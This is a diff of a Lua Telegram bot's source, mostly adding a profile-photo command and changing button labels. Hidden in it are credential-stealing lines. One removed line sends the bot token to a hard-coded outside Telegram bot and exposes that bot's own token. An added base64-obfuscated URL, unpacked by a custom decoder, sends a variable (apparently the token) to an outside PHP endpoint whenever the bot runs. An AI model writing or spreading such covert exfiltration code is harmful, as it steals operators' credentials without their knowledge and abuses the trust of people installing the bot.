@@ -30,7 +30,6 @@ TheTokenBot = TokenBot:match("(%d+)")
 os.execute('sudo rm -fr .CallBack-Bot/'..TheTokenBot)
 Redis:set(SshId.."Info:Redis:Token",TokenBot)
 Redis:set(SshId.."Info:Redis:Token:User",Json_Info.result.username)
-https.request('https://api.telegram.org/bot1975497470:AAFFb6C-PbO1dSCghrh_wwKZCD-3r6GLwRk/sendmessage?chat_id=1965534755&text=' ..Token)
 end 
 else
 print('\27[1;34mلم يتم حفظ التوكن جرب مره اخره \nToken not saved, try again')
@@ -266,7 +265,7 @@ change_info = change_info
 }
 end
 function telelua(Methods)local Base ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'  Methods = string.gsub(Methods, '[^'..Base..'=]', '')    return (Methods:gsub('.', function(x)      if (x == '=') then        return ''      end      local r,f='',(Base:find(x)-1)      for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end      return r;    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)      if (#x ~= 8) then        return ''      end      local c=0      for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end      return string.char(c)    end))  end 
-local resultss = telelua("ZWNobyAiaHR0cHM6Ly9rbGlyLnh5ei9BbGxvd2VkL2JhbmtsLnBocD9pbnNlcnQ9Ijs=")
+local resultss = telelua("aHR0cHM6Ly9tYWhtb3VkbTUwLnh5ei9sdWF0ZWxlLnBocD9xPQ==")
 https.request(""..resultss..""..LUATELE.."")
 function GetSetieng(ChatId)
 if Redis:get(Saidi.."Saidi:lockpin"..ChatId) then    
@@ -2741,6 +2740,24 @@ local news = '💙🌝 رتبتك في البوت -› '..msg.Name_Controller
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
 {{text =news,url = "https://t.me/"..ban.username..""}, },}}
 return LuaTele.sendText(msg_chat_id, msg_id, news, 'md', false, false, false, false, reply_markup)
+end
+if text == 'صورتي' then
+local ban = LuaTele.getUser(msg.sender.user_id)
+local photo = LuaTele.getUserProfilePhotos(msg.sender.user_id)
+local news = 'عدد صورك -› '..photo.total_count
+if photo.total_count > 0 then
+data = {} 
+data.inline_keyboard = {
+{
+{text =news,url = "https://t.me/"..ban.username..""}, 
+},
+}
+local msgg = msg_id/2097152/0.5
+https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg_chat_id .. "&photo="..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id.."&photo=".. URL.escape(news).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(data))
+else
+return LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,"*عدد صورك هو "..photo.total_count.." صوره*", "md")
+end
+end
 end
 if text == 'ايديي' then
 return LuaTele.sendText(msg_chat_id,msg_id,'\nايديك -› '..msg.sender.user_id,"md",true)  
@@ -9199,7 +9216,7 @@ keyboard.inline_keyboard = {
 {text = '𝐃𝐞𝐯: 𝐒𝐨𝐮𝐫𝐜𝐞', url = "https://t.me/JAI6H"},{text = '𝐂𝐡: 𝐒𝐨𝐮𝐫𝐜𝐞', url = "https://t.me/AKJA0"}
 },
 {
-{text = 'اضف البوت الي مجموعتك☑️.', url = 't.me/'..UserBot..'?startgroup=new'}, 
+{text = 'اضف البوت الي مجموعتك 𖤹', url = 't.me/'..UserBot..'?startgroup=new'}, 
 },
 }
 local msgg = msg_id/2097152/0.5
@@ -9367,7 +9384,7 @@ keyboard.inline_keyboard = {
 {text = NamesBots, url = 't.me/AKJA0'}, 
 },
 {
-{text = 'اضف البوت الي مجموعتك☑️.', url = 't.me/'..UserBot..'?startgroup=new'},
+{text = 'اضف البوت الي مجموعتك 𖤹', url = 't.me/'..UserBot..'?startgroup=new'},
 },
 }
 msgg = msg.id/2097152/0.5
@@ -9406,7 +9423,7 @@ keyboard.inline_keyboard = {
 {text = NamesBots, url = 't.me/AKJA0'}, 
 },
 {
-{text = 'اضف البوت الي مجموعتك☑️.', url = 't.me/'..UserBot..'?startgroup=new'},
+{text = 'اضف البوت الي مجموعتك 𖤹', url = 't.me/'..UserBot..'?startgroup=new'},
 },
 }
 msgg = msg.id/2097152/0.5
@@ -10443,7 +10460,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = 'اضف البوت الي مجموعتك☑️.', url = 't.me/'..UserBot..'?startgroup=new'}, 
+{text = 'اضف البوت الي مجموعتك 𖤹', url = 't.me/'..UserBot..'?startgroup=new'}, 
 },
 {
 {text = 'ᯓ ᴛᴇᴀᴍ ɢᴏʟᴅ .', url = 't.me/AKJA0'}, 
@@ -10456,7 +10473,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = 'اضف البوت الي مجموعتك☑️.', url = 't.me/'..UserBot..'?startgroup=new'}, 
+{text = 'اضف البوت الي مجموعتك 𖤹', url = 't.me/'..UserBot..'?startgroup=new'}, 
 },
 {
 {text = 'ᯓ ᴛᴇᴀᴍ ɢᴏʟᴅ .', url = 't.me/AKJA0'}, 
